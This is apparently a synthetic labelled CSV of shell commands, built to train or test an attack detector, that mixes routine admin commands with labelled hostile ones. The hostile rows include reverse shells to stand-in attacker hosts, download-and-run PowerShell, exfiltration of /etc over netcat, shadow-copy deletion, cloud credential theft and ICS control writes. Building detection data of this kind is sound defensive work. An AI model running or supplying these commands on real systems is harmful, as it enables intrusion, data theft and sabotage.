timestamp,src_ip,input,label
2026-01-20T17:46:38.699355,160.235.149.144,npm start,Normal_Business_Ops
2026-01-20T17:46:38.725166,76.73.185.47,nc -lvp 4444 -e /bin/sh,Advanced_RCE_&_C2
2026-01-20T17:46:38.755771,212.183.247.195,tar -czvf - /etc/ | nc attacker.host 9999,Ransomware_Prep
2026-01-20T17:46:38.747362,146.101.72.9,{{7*7}},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.684749,150.125.186.39,sudo systemctl restart nginx,Normal_Business_Ops
2026-01-20T17:46:38.731167,112.239.230.36,"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker.xyz:443",Advanced_RCE_&_C2
2026-01-20T17:46:38.743361,185.251.6.64,${jndi:ldap://attacker.cloud/exploit},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.754419,106.138.78.184,cipher /w:C:\,Ransomware_Prep
2026-01-20T17:46:38.688752,2.101.114.78,ssh admin@10.0.0.5,Normal_Business_Ops
2026-01-20T17:46:38.688752,126.58.231.180,whoami,Normal_Business_Ops
2026-01-20T17:46:38.730167,130.31.239.203,"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker.xyz:443",Advanced_RCE_&_C2
2026-01-20T17:46:38.720628,95.90.107.97,powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File c:\temp\s.ps1,Advanced_Persistence_&_LotL
2026-01-20T17:46:38.718598,52.60.98.24,chattr +i /home/user/.ssh/authorized_keys,Advanced_Persistence_&_LotL
2026-01-20T17:46:38.696355,188.45.168.93,df -h,Normal_Business_Ops
2026-01-20T17:46:38.704359,167.76.66.148,curl https://google.com,Normal_Business_Ops
2026-01-20T17:46:38.746362,206.147.121.147,{{7*7}},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.702379,62.81.231.77,ping -c 4 8.8.8.8,Normal_Business_Ops
2026-01-20T17:46:38.705366,101.190.37.89,ps -ef | grep python,Normal_Business_Ops
2026-01-20T17:46:38.703359,60.239.207.146,whoami,Normal_Business_Ops
2026-01-20T17:46:38.693354,210.87.8.218,pip install requests,Normal_Business_Ops
2026-01-20T17:46:38.693354,67.168.197.140,tail -f /var/log/syslog,Normal_Business_Ops
2026-01-20T17:46:38.715600,66.252.232.146,"echo ""*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/80 0>&1'"" | crontab -",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.706408,131.92.76.50,systemctl status docker,Normal_Business_Ops
2026-01-20T17:46:38.730167,111.228.151.199,"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker.xyz:443",Advanced_RCE_&_C2
2026-01-20T17:46:38.715600,2.3.79.198,chattr +i /home/user/.ssh/authorized_keys,Advanced_Persistence_&_LotL
2026-01-20T17:46:38.724165,138.160.136.118,"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker.xyz:443",Advanced_RCE_&_C2
2026-01-20T17:46:38.701356,69.99.187.118,whoami,Normal_Business_Ops
2026-01-20T17:46:38.708422,52.105.46.201,curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token,Cloud_&_Container_Exploit
2026-01-20T17:46:38.727166,188.206.114.126,"python -c ""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",-i""]);""",Advanced_RCE_&_C2
2026-01-20T17:46:38.748407,221.5.61.100,${jndi:rmi://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.728166,72.145.215.144,bash -i >& /dev/tcp/1.2.3.4/8080 0>&1,Advanced_RCE_&_C2
2026-01-20T17:46:38.704359,171.83.61.192,make build,Normal_Business_Ops
2026-01-20T17:46:38.724165,37.121.219.218,nc -lvp 4444 -e /bin/sh,Advanced_RCE_&_C2
2026-01-20T17:46:38.745361,165.201.67.234,${jndi:dns://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.729167,105.134.75.191,nc -lvp 4444 -e /bin/sh,Advanced_RCE_&_C2
2026-01-20T17:46:38.714423,73.126.184.11,kubectl get secrets --all-namespaces -o json,Cloud_&_Container_Exploit
2026-01-20T17:46:38.707462,216.248.183.60,go run main.go,Normal_Business_Ops
2026-01-20T17:46:38.703359,68.232.110.251,ps -ef | grep python,Normal_Business_Ops
2026-01-20T17:46:38.750363,185.7.46.129,vssadmin.exe delete shadows /all /quiet,Ransomware_Prep
2026-01-20T17:46:38.735167,81.248.150.70,bacnet_scan --target 192.168.1.0/24,Critical_Infrastructure_ICS
2026-01-20T17:46:38.701356,154.64.65.13,sudo systemctl restart nginx,Normal_Business_Ops
2026-01-20T17:46:38.686752,164.100.99.31,ls -lha /var/www/html,Normal_Business_Ops
2026-01-20T17:46:38.729167,187.40.160.207,nc -lvp 4444 -e /bin/sh,Advanced_RCE_&_C2
2026-01-20T17:46:38.688752,146.63.117.112,"grep ""error"" application.log",Normal_Business_Ops
2026-01-20T17:46:38.712423,204.138.35.47,curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token,Cloud_&_Container_Exploit
2026-01-20T17:46:38.719650,113.56.141.55,"powershell.exe -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.710422,50.205.41.20,docker run -it --rm -v /:/host/ root/ubuntu chroot /host/,Cloud_&_Container_Exploit
2026-01-20T17:46:38.692357,102.211.179.158,sudo systemctl restart nginx,Normal_Business_Ops
2026-01-20T17:46:38.687752,46.21.231.115,go run main.go,Normal_Business_Ops
2026-01-20T17:46:38.753424,21.237.225.33,cipher /w:C:\,Ransomware_Prep
2026-01-20T17:46:38.753424,213.230.37.92,openssl enc -aes-256-cbc -in production.db -out production.db.enc,Ransomware_Prep
2026-01-20T17:46:38.739701,146.178.225.65,modbus_client -m tcp -p 502 127.0.0.1 write_register 10 1000,Critical_Infrastructure_ICS
2026-01-20T17:46:38.701356,80.12.41.53,kubectl get services --all-namespaces,Normal_Business_Ops
2026-01-20T17:46:38.716597,188.173.218.88,"echo ""*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/80 0>&1'"" | crontab -",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.709422,206.156.156.102,curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role,Cloud_&_Container_Exploit
2026-01-20T17:46:38.735167,52.35.125.214,modbus_write_register 502 1 65535,Critical_Infrastructure_ICS
2026-01-20T17:46:38.715600,206.54.80.230,"powershell -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.705366,179.48.125.169,npm start,Normal_Business_Ops
2026-01-20T17:46:38.754419,39.192.231.72,vssadmin.exe delete shadows /all /quiet,Ransomware_Prep
2026-01-20T17:46:38.701356,123.136.177.96,pip install requests,Normal_Business_Ops
2026-01-20T17:46:38.754419,30.232.223.178,openssl enc -aes-256-cbc -in production.db -out production.db.enc,Ransomware_Prep
2026-01-20T17:46:38.688752,55.20.108.238,ssh admin@10.0.0.5,Normal_Business_Ops
2026-01-20T17:46:38.754419,162.51.225.190,vssadmin.exe delete shadows /all /quiet,Ransomware_Prep
2026-01-20T17:46:38.701356,21.228.191.230,journalctl -u ssh.service,Normal_Business_Ops
2026-01-20T17:46:38.713423,156.70.157.215,cat /run/secrets/kubernetes.io/serviceaccount/token,Cloud_&_Container_Exploit
2026-01-20T17:46:38.695355,167.127.231.99,vi /etc/nginx/nginx.conf,Normal_Business_Ops
2026-01-20T17:46:38.748407,33.80.40.34,${jndi:ldap://attacker.cloud/exploit},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.734167,28.69.19.54,nc -lvp 4444 -e /bin/sh,Advanced_RCE_&_C2
2026-01-20T17:46:38.741361,87.174.136.59,bacnet_scan --target 192.168.1.0/24,Critical_Infrastructure_ICS
2026-01-20T17:46:38.696355,199.125.96.114,ls -lha /var/www/html,Normal_Business_Ops
2026-01-20T17:46:38.753424,179.107.164.169,cipher /w:C:\,Ransomware_Prep
2026-01-20T17:46:38.719650,77.229.33.171,chattr +i /home/user/.ssh/authorized_keys,Advanced_Persistence_&_LotL
2026-01-20T17:46:38.701356,113.8.225.36,cat /etc/resolv.conf,Normal_Business_Ops
2026-01-20T17:46:38.706916,147.120.66.145,netstat -tulpn,Normal_Business_Ops
2026-01-20T17:46:38.723165,189.69.112.153,bitsadmin /transfer myJob http://bad.com/payload.exe C:\temp\p.exe,Advanced_Persistence_&_LotL
2026-01-20T17:46:38.750363,97.223.177.72,openssl enc -aes-256-cbc -in production.db -out production.db.enc,Ransomware_Prep
2026-01-20T17:46:38.717597,182.181.51.42,"powershell.exe -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.711422,212.86.75.17,aws s3 sync s3://company-private-bucket ./stolen-data,Cloud_&_Container_Exploit
2026-01-20T17:46:38.726165,71.152.210.171,"python -c ""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",-i""]);""",Advanced_RCE_&_C2
2026-01-20T17:46:38.685785,70.89.102.252,tail -f /var/log/syslog,Normal_Business_Ops
2026-01-20T17:46:38.749363,171.186.10.174,wmic shadowcopy delete,Ransomware_Prep
2026-01-20T17:46:38.740386,49.127.67.223,s7_comm_stop_cpu_all,Critical_Infrastructure_ICS
2026-01-20T17:46:38.691848,35.247.79.154,ping -c 4 8.8.8.8,Normal_Business_Ops
2026-01-20T17:46:38.740386,77.233.88.78,bacnet_scan --target 192.168.1.0/24,Critical_Infrastructure_ICS
2026-01-20T17:46:38.755771,18.83.34.209,vssadmin delete shadows /all /quiet,Ransomware_Prep
2026-01-20T17:46:38.720628,146.4.107.72,powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File c:\temp\s.ps1,Advanced_Persistence_&_LotL
2026-01-20T17:46:38.737706,13.27.10.96,s7_comm_stop_cpu_all,Critical_Infrastructure_ICS
2026-01-20T17:46:38.754419,123.161.173.89,vssadmin.exe delete shadows /all /quiet,Ransomware_Prep
2026-01-20T17:46:38.714423,175.30.165.202,kubectl get secrets --all-namespaces -o json,Cloud_&_Container_Exploit
2026-01-20T17:46:38.697356,46.65.147.69,npm start,Normal_Business_Ops
2026-01-20T17:46:38.694354,210.1.240.66,git branch,Normal_Business_Ops
2026-01-20T17:46:38.754419,120.155.49.22,wmic shadowcopy delete,Ransomware_Prep
2026-01-20T17:46:38.737706,169.89.55.239,modbus_write_register 502 1 65535,Critical_Infrastructure_ICS
2026-01-20T17:46:38.751363,199.105.190.95,vssadmin.exe delete shadows /all /quiet,Ransomware_Prep
2026-01-20T17:46:38.710422,113.85.127.38,aws s3 sync s3://company-private-bucket ./stolen-data,Cloud_&_Container_Exploit
2026-01-20T17:46:38.716597,166.102.134.45,powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File c:\temp\s.ps1,Advanced_Persistence_&_LotL
2026-01-20T17:46:38.694354,4.48.101.10,history | tail -n 20,Normal_Business_Ops
2026-01-20T17:46:38.725166,92.122.23.168,"python3 -c ""import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('1.2.3.4',443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')""",Advanced_RCE_&_C2
2026-01-20T17:46:38.719650,206.123.120.1,chattr +i /home/user/.ssh/authorized_keys,Advanced_Persistence_&_LotL
2026-01-20T17:46:38.710422,62.105.234.114,curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token,Cloud_&_Container_Exploit
2026-01-20T17:46:38.736168,27.126.105.212,modbus_write_register 502 1 65535,Critical_Infrastructure_ICS
2026-01-20T17:46:38.687752,69.75.142.126,df -h,Normal_Business_Ops
2026-01-20T17:46:38.714423,144.4.152.206,az account get-access-token --resource https://management.azure.com/,Cloud_&_Container_Exploit
2026-01-20T17:46:38.703359,32.239.99.213,whoami,Normal_Business_Ops
2026-01-20T17:46:38.721658,200.36.239.177,bitsadmin /transfer myJob http://bad.com/payload.exe C:\temp\p.exe,Advanced_Persistence_&_LotL
2026-01-20T17:46:38.704359,144.221.93.199,systemctl status docker,Normal_Business_Ops
2026-01-20T17:46:38.737194,108.13.172.202,ethernet_ip_request --service 0x4C --class 0x67,Critical_Infrastructure_ICS
2026-01-20T17:46:38.720628,213.58.82.235,"powershell -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.687752,143.55.164.18,"grep ""error"" application.log",Normal_Business_Ops
2026-01-20T17:46:38.705366,213.133.243.133,df -h,Normal_Business_Ops
2026-01-20T17:46:38.729167,127.44.110.186,"python3 -c ""import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('1.2.3.4',443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')""",Advanced_RCE_&_C2
2026-01-20T17:46:38.735167,210.172.159.236,ethernet_ip_request --service 0x4C --class 0x67,Critical_Infrastructure_ICS
2026-01-20T17:46:38.703359,7.4.80.22,systemctl status docker,Normal_Business_Ops
2026-01-20T17:46:38.696355,129.182.108.64,journalctl -u ssh.service,Normal_Business_Ops
2026-01-20T17:46:38.711422,10.207.76.225,cat /run/secrets/kubernetes.io/serviceaccount/token,Cloud_&_Container_Exploit
2026-01-20T17:46:38.691848,116.122.69.95,docker-compose up -d,Normal_Business_Ops
2026-01-20T17:46:38.720628,219.133.168.90,"powershell -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.728166,189.205.110.95,nc -lvp 4444 -e /bin/sh,Advanced_RCE_&_C2
2026-01-20T17:46:38.724165,197.216.42.117,"python -c ""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",-i""]);""",Advanced_RCE_&_C2
2026-01-20T17:46:38.690278,160.106.132.121,ping -c 4 8.8.8.8,Normal_Business_Ops
2026-01-20T17:46:38.747362,146.200.250.223,${jndi:rmi://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.732168,157.16.228.23,"python -c ""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",-i""]);""",Advanced_RCE_&_C2
2026-01-20T17:46:38.697356,57.144.17.4,go run main.go,Normal_Business_Ops
2026-01-20T17:46:38.738701,151.29.107.2,modbus_client -m tcp -p 502 127.0.0.1 write_register 10 1000,Critical_Infrastructure_ICS
2026-01-20T17:46:38.748407,159.169.2.3,{{7*7}},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.730167,35.29.140.64,"python3 -c ""import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('1.2.3.4',443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')""",Advanced_RCE_&_C2
2026-01-20T17:46:38.709422,70.102.167.45,curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token,Cloud_&_Container_Exploit
2026-01-20T17:46:38.735167,178.154.55.157,ethernet_ip_request --service 0x4C --class 0x67,Critical_Infrastructure_ICS
2026-01-20T17:46:38.733168,214.232.32.144,nc -lvp 4444 -e /bin/sh,Advanced_RCE_&_C2
2026-01-20T17:46:38.753424,91.88.246.251,tar -czvf - /etc/ | nc attacker.host 9999,Ransomware_Prep
2026-01-20T17:46:38.709422,16.88.167.210,curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token,Cloud_&_Container_Exploit
2026-01-20T17:46:38.723165,1.190.231.142,powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File c:\temp\s.ps1,Advanced_Persistence_&_LotL
2026-01-20T17:46:38.738701,108.61.157.176,modbus_client -m tcp -p 502 127.0.0.1 write_register 10 1000,Critical_Infrastructure_ICS
2026-01-20T17:46:38.692357,163.120.222.68,systemctl status docker,Normal_Business_Ops
2026-01-20T17:46:38.755771,155.70.64.168,vssadmin.exe delete shadows /all /quiet,Ransomware_Prep
2026-01-20T17:46:38.732168,160.228.144.134,"python -c ""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",-i""]);""",Advanced_RCE_&_C2
2026-01-20T17:46:38.735167,50.137.107.82,modbus_write_register 502 1 65535,Critical_Infrastructure_ICS
2026-01-20T17:46:38.692357,186.98.218.199,cat /etc/resolv.conf,Normal_Business_Ops
2026-01-20T17:46:38.713423,213.66.45.98,kubectl get secrets --all-namespaces -o json,Cloud_&_Container_Exploit
2026-01-20T17:46:38.749363,169.203.6.50,tar -czvf - /etc/ | nc attacker.host 9999,Ransomware_Prep
2026-01-20T17:46:38.744361,97.74.21.200,"{""__proto__"": {""polluted"": true}}",Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.735167,16.253.196.127,ethernet_ip_request --service 0x4C --class 0x67,Critical_Infrastructure_ICS
2026-01-20T17:46:38.735167,44.74.233.147,ethernet_ip_request --service 0x4C --class 0x67,Critical_Infrastructure_ICS
2026-01-20T17:46:38.723165,216.1.71.140,"schtasks /create /sc minute /mo 1 /tn ""SystemUpdate"" /tr ""C:\temp\backdoor.exe""",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.690278,11.220.184.20,history | tail -n 20,Normal_Business_Ops
2026-01-20T17:46:38.733168,9.146.190.242,sh -i >& /dev/tcp/attacker.xyz/443 0>&1,Advanced_RCE_&_C2
2026-01-20T17:46:38.725166,37.21.216.207,"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker.xyz:443",Advanced_RCE_&_C2
2026-01-20T17:46:38.688752,144.196.148.66,curl https://google.com,Normal_Business_Ops
2026-01-20T17:46:38.696355,97.203.108.30,docker-compose up -d,Normal_Business_Ops
2026-01-20T17:46:38.718598,148.75.106.231,"schtasks /create /sc minute /mo 1 /tn ""SystemUpdate"" /tr ""C:\temp\backdoor.exe""",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.744361,187.66.179.247,${jndi:ldap://attacker.cloud/exploit},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.686752,33.32.99.96,make build,Normal_Business_Ops
2026-01-20T17:46:38.693354,76.170.120.80,history | tail -n 20,Normal_Business_Ops
2026-01-20T17:46:38.722168,25.254.132.230,bitsadmin /transfer myJob http://bad.com/payload.exe C:\temp\p.exe,Advanced_Persistence_&_LotL
2026-01-20T17:46:38.717597,88.94.105.4,"powershell -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.717597,216.20.2.27,"powershell.exe -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.751920,46.200.37.48,openssl enc -aes-256-cbc -in production.db -out production.db.enc,Ransomware_Prep
2026-01-20T17:46:38.689753,78.125.165.141,curl https://google.com,Normal_Business_Ops
2026-01-20T17:46:38.748407,25.69.104.81,${jndi:ldap://attacker.cloud/exploit},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.698355,141.202.4.42,kubectl get services --all-namespaces,Normal_Business_Ops
2026-01-20T17:46:38.753424,74.192.98.69,vssadmin.exe delete shadows /all /quiet,Ransomware_Prep
2026-01-20T17:46:38.695355,119.40.13.158,netstat -tulpn,Normal_Business_Ops
2026-01-20T17:46:38.755771,141.220.224.64,tar -czvf - /etc/ | nc attacker.host 9999,Ransomware_Prep
2026-01-20T17:46:38.708422,14.247.113.191,curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role,Cloud_&_Container_Exploit
2026-01-20T17:46:38.719650,3.9.68.124,"powershell.exe -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.725166,204.234.76.222,"python3 -c ""import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('1.2.3.4',443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')""",Advanced_RCE_&_C2
2026-01-20T17:46:38.688752,96.249.92.25,tail -f /var/log/syslog,Normal_Business_Ops
2026-01-20T17:46:38.696355,220.197.104.124,git add .,Normal_Business_Ops
2026-01-20T17:46:38.732168,15.173.59.69,sh -i >& /dev/tcp/attacker.xyz/443 0>&1,Advanced_RCE_&_C2
2026-01-20T17:46:38.738701,29.77.174.104,set_pump_speed 10000 --force,Critical_Infrastructure_ICS
2026-01-20T17:46:38.695355,74.63.84.196,ssh admin@10.0.0.5,Normal_Business_Ops
2026-01-20T17:46:38.684749,214.77.170.219,whoami,Normal_Business_Ops
2026-01-20T17:46:38.700357,76.250.146.33,curl https://google.com,Normal_Business_Ops
2026-01-20T17:46:38.730167,139.199.231.76,"python3 -c ""import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('1.2.3.4',443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')""",Advanced_RCE_&_C2
2026-01-20T17:46:38.710422,181.251.95.6,curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role,Cloud_&_Container_Exploit
2026-01-20T17:46:38.707462,176.221.27.193,ssh admin@10.0.0.5,Normal_Business_Ops
2026-01-20T17:46:38.738701,215.197.130.46,ethernet_ip_request --service 0x4C --class 0x67,Critical_Infrastructure_ICS
2026-01-20T17:46:38.731167,98.26.141.126,"python3 -c ""import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('1.2.3.4',443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')""",Advanced_RCE_&_C2
2026-01-20T17:46:38.684749,42.207.132.246,make build,Normal_Business_Ops
2026-01-20T17:46:38.701356,13.250.77.54,journalctl -u ssh.service,Normal_Business_Ops
2026-01-20T17:46:38.729167,20.117.74.132,"python -c ""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",-i""]);""",Advanced_RCE_&_C2
2026-01-20T17:46:38.740386,26.191.225.161,ethernet_ip_request --service 0x4C --class 0x67,Critical_Infrastructure_ICS
2026-01-20T17:46:38.744361,1.134.145.78,${jndi:ldap://attacker.cloud/exploit},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.697356,107.18.187.246,git push origin main,Normal_Business_Ops
2026-01-20T17:46:38.723165,95.100.102.45,"powershell -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.691257,151.79.201.193,go run main.go,Normal_Business_Ops
2026-01-20T17:46:38.701356,217.209.188.241,tail -f /var/log/syslog,Normal_Business_Ops
2026-01-20T17:46:38.753424,75.113.232.198,tar -czvf - /etc/ | nc attacker.host 9999,Ransomware_Prep
2026-01-20T17:46:38.730167,179.184.68.200,bash -i >& /dev/tcp/1.2.3.4/8080 0>&1,Advanced_RCE_&_C2
2026-01-20T17:46:38.715600,64.102.208.49,"powershell -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.715594,54.93.26.37,az account get-access-token --resource https://management.azure.com/,Cloud_&_Container_Exploit
2026-01-20T17:46:38.729167,106.38.11.91,"bash -c ""exec 5<>/dev/tcp/attacker.xyz/443;cat <&5 | while read line; do $line 2>&5 >&5; done""",Advanced_RCE_&_C2
2026-01-20T17:46:38.754419,86.167.192.68,cipher /w:C:\,Ransomware_Prep
2026-01-20T17:46:38.698355,89.241.118.43,sudo systemctl restart nginx,Normal_Business_Ops
2026-01-20T17:46:38.709422,212.243.41.130,az account get-access-token --resource https://management.azure.com/,Cloud_&_Container_Exploit
2026-01-20T17:46:38.698355,211.171.51.224,systemctl status docker,Normal_Business_Ops
2026-01-20T17:46:38.713423,186.238.33.189,curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role,Cloud_&_Container_Exploit
2026-01-20T17:46:38.710422,73.139.213.199,az account get-access-token --resource https://management.azure.com/,Cloud_&_Container_Exploit
2026-01-20T17:46:38.688752,17.204.162.16,sudo systemctl restart nginx,Normal_Business_Ops
2026-01-20T17:46:38.741361,57.116.28.67,ethernet_ip_request --service 0x4C --class 0x67,Critical_Infrastructure_ICS
2026-01-20T17:46:38.705366,99.21.82.207,kubectl get services --all-namespaces,Normal_Business_Ops
2026-01-20T17:46:38.691829,136.105.252.130,git branch,Normal_Business_Ops
2026-01-20T17:46:38.754419,95.98.71.222,tar -czvf - /etc/ | nc attacker.host 9999,Ransomware_Prep
2026-01-20T17:46:38.723165,143.144.151.34,"echo ""*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/80 0>&1'"" | crontab -",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.738701,167.171.26.171,bacnet_scan --target 192.168.1.0/24,Critical_Infrastructure_ICS
2026-01-20T17:46:38.709422,92.133.88.20,kubectl get secrets --all-namespaces -o json,Cloud_&_Container_Exploit
2026-01-20T17:46:38.725166,157.106.87.116,sh -i >& /dev/tcp/attacker.xyz/443 0>&1,Advanced_RCE_&_C2
2026-01-20T17:46:38.708422,118.60.230.189,docker run -it --rm -v /:/host/ root/ubuntu chroot /host/,Cloud_&_Container_Exploit
2026-01-20T17:46:38.715600,136.123.142.78,powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File c:\temp\s.ps1,Advanced_Persistence_&_LotL
2026-01-20T17:46:38.713423,1.72.133.112,cat /run/secrets/kubernetes.io/serviceaccount/token,Cloud_&_Container_Exploit
2026-01-20T17:46:38.684749,207.155.121.49,tail -f /var/log/syslog,Normal_Business_Ops
2026-01-20T17:46:38.714423,186.119.77.111,curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role,Cloud_&_Container_Exploit
2026-01-20T17:46:38.745361,68.151.244.82,{{7*7}},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.723165,71.63.4.60,"powershell.exe -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.730167,126.237.219.185,sh -i >& /dev/tcp/attacker.xyz/443 0>&1,Advanced_RCE_&_C2
2026-01-20T17:46:38.751920,53.44.233.69,wmic shadowcopy delete,Ransomware_Prep
2026-01-20T17:46:38.726165,222.68.228.198,"bash -c ""exec 5<>/dev/tcp/attacker.xyz/443;cat <&5 | while read line; do $line 2>&5 >&5; done""",Advanced_RCE_&_C2
